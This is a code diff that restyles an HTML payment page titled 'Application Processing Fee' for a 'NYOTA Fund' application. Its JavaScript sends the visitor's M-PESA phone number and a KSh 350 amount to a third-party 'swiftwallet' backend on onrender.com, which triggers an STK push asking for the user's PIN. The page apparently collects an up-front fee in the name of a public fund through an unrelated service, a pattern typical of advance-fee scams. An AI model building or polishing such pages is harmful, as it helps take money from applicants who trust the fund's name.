@@ -25,107 +25,100 @@ body{
 .card{
     background:white;
     padding:20px;
-    border-radius:10px;
+    border-radius:12px;
+    box-shadow:0 5px 15px rgba(0,0,0,.2);
 }
 
 h1{
     text-align:center;
     color:#1565c0;
-    font-size:22px;
+    font-size:24px;
+    margin-bottom:20px;
 }
 
 p{
     text-align:center;
-    font-size:15px;
+    font-size:16px;
+    line-height:1.6;
 }
 
 label{
     display:block;
-    margin-top:15px;
+    margin-top:18px;
+    margin-bottom:6px;
     font-weight:bold;
 }
 
 input{
     width:100%;
-    padding:12px;
-    margin-top:5px;
+    padding:14px;
     border-radius:8px;
     border:1px solid #ccc;
     box-sizing:border-box;
+    font-size:16px;
 }
 
 button{
     width:100%;
-    padding:14px;
-    margin-top:20px;
+    padding:15px;
+    margin-top:22px;
     background:#1565c0;
     color:white;
     border:none;
     border-radius:8px;
     font-size:18px;
+    cursor:pointer;
+}
+
+#stkMessage{
+    margin-top:15px;
+    color:#0b6b0b;
+    font-weight:bold;
 }
 
 </style>
 
 </head>
 
-
 <body>
-
 
 <div class="container">
 
 <div class="card">
 
-
-<h1>
-NYOTA FUNDS Processing Fee Payment
-</h1>
-
+<h1>Application Processing Fee</h1>
 
 <p>
-Hi 👋 <span id="name"></span>!
-</p>
-
-
-<p>
-Complete your payment to complete your NYOTA Funds application.
+Welcome, <b><span id="name"></span></b>
 </p>
 
 <p>
-Processing Fee: <b>Ksh 350</b>
-</p> 
+Please pay the application processing fee to continue with your NYOTA Fund application.
+</p>
 
+<p>
+<b>Application Processing Fee: KSh 350</b>
+</p>
 
-<label>
-Full Name
-</label>
+<label>Full Name</label>
 
-<input type="text" id="fullName">
+<input type="text" id="fullName" readonly>
 
-
-<label>
-Phone Number
-</label>
+<label>M-PESA Phone Number</label>
 
 <input type="tel" id="phone" placeholder="2547XXXXXXXX">
 
 <button id="payBtn" onclick="payNow()">
-Pay Now
+Pay Application Fee
 </button>
 
 <p id="stkMessage"></p>
 
-
-
 </div>
 
 </div>
-
-
 
 <script>
-
 
 let applicant = localStorage.getItem("applicantName");
 
@@ -137,28 +130,24 @@ applicant || "";
 
 async function payNow(){
 
-
 let phone = document.getElementById("phone").value;
-localStorage.setItem("phoneNumber", phone);
-let btn = document.getElementById("payBtn");
 
+localStorage.setItem("phoneNumber", phone);
+
+let btn = document.getElementById("payBtn");
 
 if(phone===""){
 
-alert("Enter phone number");
+alert("Please enter your M-PESA phone number.");
+
 return;
 
 }
 
-
-btn.innerHTML = "Sending STK Push...";
-btn.disabled = true;
-
-
+btn.innerHTML="Sending STK Push...";
+btn.disabled=true;
 
 try{
-
-
 
 let response = await fetch(
 "https://swiftwallet-backend-k8kn.onrender.com/stk-push",
@@ -167,46 +156,37 @@ method:"POST",
 headers:{
 "Content-Type":"application/json"
 },
-body: JSON.stringify({
-phone: phone,
-amount: 350
+body:JSON.stringify({
+phone:phone,
+amount:350
 })
 }
 );
 
-
-let data = await response.json();
+let data=await response.json();
 
 console.log(data);
 
-btn.innerHTML = "Waiting for payment...";
-btn.disabled = true;
-    
-document.getElementById("stkMessage").innerHTML =
-"STK Push sent. Enter your M-PESA PIN to complete payment.";
+btn.innerHTML="Waiting for Payment...";
+btn.disabled=true;
 
+document.getElementById("stkMessage").innerHTML=
+"An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
 
-
-
-}
-
-catch(error){
+}catch(error){
 
 console.log(error);
 
-alert("Payment request failed");
+alert("Payment request failed.");
 
-btn.innerHTML = "Pay Now";
-btn.disabled = false;
-
-}
-
+btn.innerHTML="Pay Application Fee";
+btn.disabled=false;
 
 }
 
+}
 
 </script>
-
 
 </body>
 
